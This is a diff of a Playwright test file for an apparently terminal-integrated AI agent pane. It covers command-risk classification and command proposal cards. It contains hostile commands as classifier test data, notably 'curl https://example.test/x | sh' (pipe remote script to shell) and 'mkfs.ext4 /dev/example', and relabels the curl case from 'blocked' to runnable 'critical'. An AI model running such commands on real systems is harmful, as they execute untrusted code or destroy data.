@@ -400,6 +400,7 @@ test("agent pane renders settings, context chips, and request errors", async ({
   );
   expect(settings.endpoint).toBe("http://127.0.0.1:1/v1");
   expect(settings.streaming).toBe(true);
+  expect(settings.showCodexRouterSuggestions).toBe(true);
 });
 
 test("agent streams deltas and can cancel with Stop", async ({ page }) => {
@@ -668,10 +669,10 @@ print("no")
     return {
       hints: extracted.map((proposal) => proposal.shellHint),
       raws: extracted.map((proposal) => proposal.raw),
-      low: classifyCommandRisk("cargo test").risk,
-      medium: classifyCommandRisk("npm install").risk,
-      high: classifyCommandRisk("rm -rf build").risk,
-      blocked: classifyCommandRisk("curl https://example.test/x | sh").risk,
+      low: classifyCommandRisk("git status").risk,
+      medium: classifyCommandRisk("cargo test").risk,
+      high: classifyCommandRisk("npm install").risk,
+      critical: classifyCommandRisk("curl https://example.test/x | sh").risk,
     };
   });
   expect(result.hints).toEqual([
@@ -686,7 +687,7 @@ print("no")
     low: "low",
     medium: "medium",
     high: "high",
-    blocked: "blocked",
+    critical: "critical",
   });
 });
 
@@ -868,17 +869,33 @@ mkfs.ext4 /dev/example
   );
   await expect(cards.nth(0)).toHaveAttribute("data-task-id", taskId!);
   await expect(cards.nth(1)).toHaveAttribute("data-task-id", taskId!);
-  await expect(cards.nth(0).getByRole("button", { name: "Copy" })).toBeVisible();
-  await expect(cards.nth(0).getByRole("button", { name: "Run", exact: true })).toBeVisible();
-  await expect(cards.nth(1)).toContainText("Blocked by Arc safety policy");
+  const proposalActivities = agent
+    .locator(".agent-activity")
+    .filter({ hasText: "Command proposal" });
+  await expect(proposalActivities).toHaveCount(2);
   await expect(
-    cards.nth(1).getByRole("button", { name: "Run", exact: true }),
-  ).toHaveCount(0);
+    proposalActivities.nth(0).getByRole("button", { name: "Copy" }),
+  ).toBeVisible();
+  await expect(
+    proposalActivities.nth(0).getByRole("button", {
+      name: "Run",
+      exact: true,
+    }),
+  ).toBeVisible();
+  await expect(cards.nth(1)).toContainText("critical");
+  await expect(
+    proposalActivities
+      .nth(1)
+      .getByRole("button", { name: "Advanced Run", exact: true }),
+  ).toBeVisible();
   await expect(
     cards.nth(1).getByRole("button", { name: "Edit", exact: true }),
-  ).toHaveCount(0);
+  ).toBeVisible();
 
-  await cards.nth(0).getByRole("button", { name: "Run", exact: true }).click();
+  await proposalActivities
+    .nth(0)
+    .getByRole("button", { name: "Run", exact: true })
+    .click();
   await expect
     .poll(() =>
       page.evaluate(
@@ -905,7 +922,10 @@ mkfs.ext4 /dev/example
   expect(firstWrite.data).toContain("__ARC_CMD_END:");
   const runId = firstWrite.data.match(/__ARC_CMD_START:([^_]+)__/i)?.[1];
   expect(runId).toBeTruthy();
-  const resultCard = cards.nth(0).locator(".command-result");
+  const resultActivity = agent
+    .locator(".agent-activity")
+    .filter({ hasText: /Command (running|completed)/ });
+  const resultCard = resultActivity.locator(".command-result");
   await expect(resultCard).toBeVisible();
   await expect(resultCard).toHaveAttribute("data-task-id", taskId!);
   await expect(taskCard.locator(".agent-task__meta")).toContainText(
@@ -918,7 +938,7 @@ mkfs.ext4 /dev/example
     resultCard.getByRole("button", { name: "Capture Output" }),
   ).toBeVisible();
   await expect(
-    resultCard.getByRole("button", { name: "Send Output to Agent" }),
+    resultActivity.getByRole("button", { name: "Send Output to Agent" }),
   ).toBeVisible();
   expect(
     await page.evaluate(
@@ -940,11 +960,13 @@ mkfs.ext4 /dev/example
     );
     runtime.appendTerminalOutput(paneId, `END:${runId}:0__\r\n`);
   }, { paneId: targetPaneId, runId: runId! });
-  await expect(resultCard.locator(".command-result__state")).toHaveText(
-    "completed",
-  );
+  await expect(resultActivity).toContainText("Command completed");
   await expect(taskCard.locator(".agent-task__status")).toHaveText(
     "command completed",
+  );
+  await resultActivity.locator(".agent-activity__toggle").click();
+  await expect(resultCard.locator(".command-result__state")).toHaveText(
+    "completed",
   );
   await expect(resultCard.locator(".command-result__header")).toContainText(
     "exit 0",
@@ -956,7 +978,7 @@ mkfs.ext4 /dev/example
   await expect(resultCard.locator(".command-result__output")).toContainText(
     "api_key=[REDACTED]",
   );
-  await resultCard
+  await resultActivity
     .getByRole("button", { name: "Send Output to Agent" })
     .click();
   await expect(resultCard.locator(".command-result__status")).toContainText(
@@ -993,12 +1015,12 @@ mkfs.ext4 /dev/example
   expect(feedbackContent).not.toContain("super-secret");
   expect(feedbackContent).not.toContain("\u001b[32m");
 
-  await cards.nth(0).getByRole("button", { name: "Run in New Terminal" }).click();
+  await proposalActivities.nth(0).locator(".agent-activity__toggle").click();
+  await cards
+    .nth(0)
+    .getByRole("button", { name: "Run in New Terminal" })
+    .click();
   await expect(page.locator(".terminal-pane")).toHaveCount(2);
-  await expect(cards.nth(0).locator(".command-proposal__status")).toContainText(
-    "new terminal",
-    { timeout: 12_000 },
-  );
   await expect
     .poll(() =>
       page.evaluate(
